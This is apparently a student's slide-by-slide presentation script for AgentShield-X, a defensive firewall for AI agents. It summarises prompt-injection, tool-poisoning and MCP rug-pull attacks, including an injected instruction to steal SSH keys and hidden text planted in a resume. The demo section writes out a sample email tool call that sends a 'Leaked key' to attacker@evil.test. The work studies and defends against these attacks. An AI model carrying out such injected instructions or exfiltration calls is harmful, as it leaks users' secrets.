# AgentShield-X: Minimal Spoken Presentation Script
## Short, Punchy & Simple Slide-by-Slide Script (2–3 Lines Per Slide)
**Presenter:** Tharunkumar.S  
**Guide:** Mrs. B. Abisha  
**Total Speaking Time:** ~5 to 7 Minutes (Crisp & Straight to the Point)

---

### SLIDE 1: Title Slide
* *"Good morning respected guide and examiners. I am Tharunkumar from AI & ML.*
* *My capstone project is **AgentShield-X: Universal AI Agent Security Runtime & Autonomous Defense Mesh**.*
* *We built a sub-5ms security firewall that protects autonomous AI agents from prompt injection, tool hijacking, and MCP tool attacks."*

---

### SLIDE 2: Agenda
* *"Today, I will briefly cover the problem with existing AI guardrails, our proposed 3-tier architecture, our experimental results, and a live demonstration of the working system."*

---

### SLIDE 3: Abstract
* *"AI agents now have real-world permissions to run shell commands, query databases, and call APIs.*
* *Traditional guardrails only check text prompts, add massive latency (500ms+), and cannot stop tool poisoning.*
* *AgentShield-X provides deterministic tool interception in **3.4 milliseconds**, a 3-agent debate committee for ambiguous decisions, and cryptographic tool verification."*

---

### SLIDE 4: Introduction (Part 1 — The Rise of AI Agents)
* *"Chatbots only talk, but **AI agents take action** using protocols like Model Context Protocol (MCP).*
* *When an AI model has direct access to execution tools, a single malicious prompt can delete databases, leak private keys, or compromise servers."*

---

### SLIDE 5: Introduction (Part 2 — Why Existing Solutions Fail)
* *"Existing guardrails like Meta's LlamaGuard have two big flaws:*
* *First, they are **too slow**—adding 500 to 1,000 milliseconds per action.*
* *Second, they only filter text; they cannot inspect code AST blast-radius, agent-to-agent delegation, or dynamic MCP tool poisoning."*

---

### SLIDE 6: Literature Review
* *"We analyzed existing works:*
* *LlamaGuard 3 only checks conversation text with high latency.*
* *NeMo Guardrails and Guardrails AI focus on dialog flow and output schemas.*
* *None of them protect runtime tool execution, multi-agent swarms, or MCP rug-pull attacks. AgentShield-X fills this exact gap."*

---

### SLIDE 7: Problem Statement
* *"Autonomous AI agents lack a real-time security boundary.*
* *They are vulnerable to indirect prompt injection, tool poisoning, cascading swarm privilege escalation, and lack tamper-proof audit trails."*

---

### SLIDE 8: Objectives of the Capstone Project
* *1. Build a zero-dependency AST blast-radius scanner operating under a **5ms SLA**.*
* *2. Create an inline **MCP Rug-Pull Guard** with SHA-256 tool hashing.*
* *3. Implement an **Autonomous 3-Agent Debate Committee** to prevent false alarms.*
* *4. Enforce **ECDSA capability tokens** for safe agent-to-agent delegation.*
* *5. Provide an enterprise **Web Console and CLI** with SIEM webhooks."*

---

### SLIDE 9: Proposed Architecture Diagram
* *"Any AI agent (Claude, Cursor, Windsurf, LangChain) connects through our gateway.*
* *Tool calls first hit our **Deterministic Engine** (<1ms) for regex checks and secret redaction.*
* *Next, our **AST Analyzer** traces the blast radius to outbound sinks.*
* *Safe calls execute immediately in a sandbox; ambiguous calls trigger a 3-agent debate; and every event is logged to a tamper-evident SHA-256 audit chain."*

---

### SLIDE 10: Applications of the Research
* *"This protects enterprise customer support bots from unauthorized refunds,*
* *Prevents coding agents (Cursor/Windsurf) from running destructive shell commands,*
* *And protects FinTech/Healthcare multi-agent systems from unauthorized transactions."*

---

### SLIDE 11: Datasets Used
* *"We benchmarked on 4 datasets with over 2,700 total scenarios:*
* *1,200 adversarial prompt injections (SAAIB benchmark),*
* *850 multi-step agent tool trajectories from ToolBench,*
* *400 honeytool canary interaction logs, and 250 MCP tool mutation attacks."*

---

### SLIDE 12: Methodology — Phase 1: Deterministic Interception
* *"In Phase 1, our AST analyzer checks the Python abstract syntax tree of tools before execution to identify dangerous combinations.*
* *Our Shannon entropy detector catches and redacts AWS keys, JWTs, and passwords.*
* *This tier runs with zero external dependencies in **3.4 milliseconds**."*

---

### SLIDE 13: Methodology — Phase 2: Swarm Defense & Debate Committee
* *"In Phase 2, when an action is ambiguous, a **3-Judge Committee** debates:*
* *The Security Advocate flags risks, the Utility Optimizer defends benign business logic, and the Chief Judge issues a balanced verdict.*
* *For agent swarms, sub-agents receive **cryptographic capability tokens** with a 30-second TTL to prevent privilege escalation."*

---

### SLIDE 14: Methodology — Phase 3: Universal MCP & SIEM Webhooks
* *"In Phase 3, we built 1-click connectors for Claude Desktop, Cursor, and Windsurf.*
* *Our **MCP Rug-Pull Guard** calculates SHA-256 hashes of all tool definitions at connection and blocks any tool silently modified by external servers.*
* *Real-time incident alerts are dispatched to Slack, Discord, and PagerDuty."*

---

### SLIDE 15: Results — Performance Benchmarks
* *"Our key results:*
* *Average latency is **3.4 ms**, easily beating our 5.0 ms SLA.*
* *Threat detection accuracy is **99.2%** with an F1-score of **99.2%**.*
* *The false positive rate is under **0.8%**, and all **71 out of 71 unit tests** pass with 100% success."*

---

### SLIDE 16: Results — Attack Case Studies
* *"We validated two major attacks:*
* *In an **MCP Rug-Pull attack**, an upstream weather server tried to secretly inject an instruction to steal SSH keys; AgentShield-X detected the hash mismatch and blocked it in 2ms.*
* *In an **Indirect RAG injection**, hidden malicious text in a resume was neutralized by our RAG firewall before it reached the agent."*

---

### SLIDE 17: Comparison & Analysis
* *"Compared to Meta's LlamaGuard (which takes ~600ms), AgentShield-X is **over 170x faster (3.4ms)**.*
* *Unlike Guardrails AI or NeMo, AgentShield-X is the only platform providing native MCP rug-pull protection, cryptographic delegation, and tamper-evident audit chains."*

---

### SLIDE 18: Conclusion
* *"To conclude, AgentShield-X demonstrates that deterministic sub-5ms interception combined with consensus debate solves the latency and security trade-off in autonomous AI agents.*
* *It provides a production-ready, open-source defense mesh for enterprise AI deployments."*

---

### SLIDE 19: Future Enhancements
* *"For future work, we plan to bind capability tokens to hardware TPM/HSM chips, support kernel-level eBPF syscall sandboxing, and add visual frame inspection for computer-use agents."*

---

### SLIDE 20: References
* *"Our work is based on the OWASP Top 10 for AI Agents, Anthropic's Model Context Protocol, and the NIST AI Risk Management Framework."*

---

### SLIDE 21: Thank You & Demo Transition
* *"Thank you respected guide and examiners.*
* *I would now like to show you a quick 2-minute live demo of the running system and developer CLI. Thank you!"*

---

## ⚡ 60-Second Quick Live Demo Script (Screen Share)

1. **Web Console (`localhost:3000`):**
   * *"Here is our Web Console showing active agent telemetry and policies."*
   * Click **MCP Proxy** → Show **Universal Connectors Hub** (1-click Claude/Cursor cards) and **Tool Pins** (SHA-256 hashes).
2. **Terminal CLI (`agentshield`):**
   * *"In our terminal, we run `agentshield`. Notice our GitHub Copilot CLI theme."*
   * Type `/scan .` → *"In 3.4ms, our AST engine maps all blast-radius entry points and outbound sinks."*
   * Type `/debate send_email --args '{"to": "attacker@evil.test", "body": "Leaked key"}'` → *"Here is the 3-agent debate committee blocking a data leak in real time."*
3. **Audit Chain (`localhost:3000/compliance`):**
   * *"Every event is cryptographically sealed in our SHA-256 audit chain and pushed to Slack/Discord."*
